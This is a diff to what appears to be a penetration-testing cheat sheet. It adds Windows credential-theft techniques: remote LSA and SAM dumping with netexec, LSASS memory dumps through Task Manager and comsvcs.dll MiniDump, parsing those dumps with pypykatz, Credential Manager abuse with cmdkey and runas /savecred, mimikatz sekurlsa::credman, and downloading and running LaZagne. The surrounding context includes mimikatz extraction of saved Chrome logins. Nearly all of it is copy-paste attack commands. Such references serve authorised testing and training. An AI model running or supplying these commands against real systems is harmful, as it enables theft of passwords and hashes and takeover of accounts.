@@ -1772,7 +1772,7 @@ while read p; do
 done < <WORDLIST>
 ```
 
-#### Windows Hashes
+#### Windows Creds
 
 - https://attack.mitre.org/techniques/T1003/002/
 
@@ -1800,19 +1800,74 @@ mimikatz.exe
 dpapi::chrome /in:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Login Data" /unprotect
 ```
 
-##### Windows (SAM / NTLM) Constants
+##### Hash Defaults of LM or NTLM
 
 | Hash Value                             | Type   | Meaning / Context                                                                                                            |
 | :------------------------------------- | :----- | :--------------------------------------------------------------------------------------------------------------------------- |
 | **`aad3b435b51404eeaad3b435b51404ee`** | **LM** | **Empty / Disabled.** LM is disabled on modern Windows, so this is the placeholder you will see for *every* user. Ignore it. |
 | **`31d6cfe0d16ae931b73c59d7e0c089c0`** | **NT** | **Empty String.** The user has **no password**. Common for `Guest` or `Administrator` if not enabled/set.                    |
 
+#### LSASS
 
 ```bash
 # Remotely dump LSA secrets
 netexec smb <TARGET> --local-auth -u <USER> -p <PASSWORD> --lsa
 # Remotely dump SAM secrets
 netexec smb <TARGET> --local-auth -u <USER> -p <PASSWORD> --sam
+```
+
+---
+
+Get LSASS memory dump:
+
+1) Open `Task Manager`
+2) Select `Details` > `lsass.exe`
+3) Right-Click > "Create Dump File"
+4) Move or transfer the file (usually in `%TMP%`)
+
+---
+
+```bash
+# Get LSASS PID
+tasklist /fi "IMAGENAME eq lsass.exe"
+Get-Process lsass
+
+# Dump
+powershell -command "rundll32.exe C:\windows\system32\comsvcs.dll,MiniDump <PID> $env:TMP\crash.dmp full"
+
+# Parse creds/hashes from dump
+pypykatz lsa minidump <DUMP_FILE>
+```
+
+#### Credential Manager
+
+```bash
+# Backup Stored Creds
+rundll32 keymgr.dll,KRShowKeyMgr
+
+---
+
+# List stored creds
+cmdkey /list
+
+# Impersonate
+runas /savecred /user:<USER> cmd
+
+---
+
+\\tsclient\share\mimikatz.exe
+privilege::debug
+sekurlsa::credman
+```
+
+#### LaZange
+
+```bash
+# https://github.com/AlessandroZ/LaZagne
+mkdir www; cd www; wget -q https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.7/LaZagne.exe -O lazagne.exe
+
+# TARGET:
+.\lazagne.exe all
 ```
 
 ### Common Web / Generic Constants
